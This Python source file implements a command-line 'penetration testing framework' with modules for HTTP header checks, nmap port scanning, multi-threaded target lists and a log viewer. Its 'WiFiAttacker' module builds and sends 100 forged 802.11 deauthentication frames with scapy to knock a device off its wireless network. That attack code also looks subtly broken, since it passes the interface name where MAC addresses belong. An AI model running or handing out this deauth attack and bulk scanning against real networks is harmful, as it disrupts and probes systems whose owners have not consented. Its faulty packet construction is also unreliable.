import sys
import os
import logging
import threading
import subprocess
import requests
from scapy.all import *
import argparse

# Setup logging
logging.basicConfig(filename='aegis.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Base class for modules
class BaseModule:
    def __init__(self, target, options):
        self.target = target
        self.options = options

    def run(self):
        raise NotImplementedError("Each module must implement the run method.")

# HTTP Vulnerability Scanner Module
class HTTPScanner(BaseModule):
    def run(self):
        try:
            response = requests.get(self.target, timeout=self.options.get('http_timeout', 10),
                                    headers={"User-Agent": self.options.get('http_user_agent', "Mozilla/5.0")})
            if "X-Frame-Options" not in response.headers:
                print(f"{self.target} is vulnerable to Clickjacking.")
                logging.info(f"{self.target} is vulnerable to Clickjacking.")
            # Add more vulnerability checks here
        except Exception as e:
            print(f"Error scanning {self.target}: {e}")
            logging.error(f"Error scanning {self.target}: {e}")

# Port Scanner Module
class PortScanner(BaseModule):
    def run(self):
        print(f"Scanning ports for {self.target}...")
        try:
            subprocess.run(['nmap', '-p', '21,22,23,80,443,3389', self.target])
            logging.info(f"Completed port scan for {self.target}")
        except Exception as e:
            print(f"Error scanning ports for {self.target}: {e}")
            logging.error(f"Error scanning ports for {self.target}: {e}")

# Wi-Fi Attack Module
class WiFiAttacker(BaseModule):
    def run(self):
        print(f"Attacking Wi-Fi network on {self.target}...")
        try:
            iface = self.options.get('interface', 'wlan0')
            target_mac = self.target
            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=iface, addr3=iface)/Dot11Deauth()
            sendp(pkt, iface=iface, count=100, inter=0.1)
            print("Attack complete.")
            logging.info(f"Executed Wi-Fi deauth attack on {self.target}")
        except Exception as e:
            print(f"Error during Wi-Fi attack on {self.target}: {e}")
            logging.error(f"Error during Wi-Fi attack on {self.target}: {e}")

# Log Viewer Module
class LogViewer:
    def view_logs(self):
        if os.path.exists('aegis.log'):
            with open('aegis.log', 'r') as log_file:
                print(log_file.read())
        else:
            print("No logs available.")

# Multi-threaded scanner
class MultiThreadScanner:
    def __init__(self, targets, module, options, threads=10):
        self.targets = targets
        self.module = module
        self.options = options
        self.threads = threads

    def worker(self, target):
        module_instance = self.module(target, self.options)
        module_instance.run()

    def run(self):
        thread_list = []
        for target in self.targets:
            t = threading.Thread(target=self.worker, args=(target,))
            t.start()
            thread_list.append(t)
            if len(thread_list) >= self.threads:
                for thread in thread_list:
                    thread.join()
                thread_list = []

# Command-line interface
def main():
    parser = argparse.ArgumentParser(description="Aegis Penetration Testing Framework")
    parser.add_argument('-t', '--target', help='Target URL, IP, or MAC address')
    parser.add_argument('-m', '--module', choices=['HTTPScanner', 'PortScanner', 'WiFiAttacker', 'LogViewer'], required=True, help='Module to run')
    parser.add_argument('-o', '--options', help='Module options in key=value format')
    parser.add_argument('-f', '--file', help='File containing multiple targets (one per line)')
    parser.add_argument('-th', '--threads', type=int, default=10, help='Number of threads to use (default: 10)')

    args = parser.parse_args()

    # Convert options to dictionary
    options = {}
    if args.options:
        options = dict(option.split('=') for option in args.options.split(','))

    # Handle multiple targets from file
    targets = []
    if args.file:
        with open(args.file, 'r') as file:
            targets = [line.strip() for line in file.readlines()]
    elif args.target:
        targets.append(args.target)
    else:
        print("Please specify a target or provide a file with targets.")
        sys.exit(1)

    # Map module name to actual module class
    modules = {
        'HTTPScanner': HTTPScanner,
        'PortScanner': PortScanner,
        'WiFiAttacker': WiFiAttacker,
        'LogViewer': LogViewer,
    }

    # Run the selected module
    if args.module == 'LogViewer':
        viewer = LogViewer()
        viewer.view_logs()
    else:
        scanner = MultiThreadScanner(targets, modules[args.module], options, threads=args.threads)
        scanner.run()

if __name__ == "__main__":
    main()
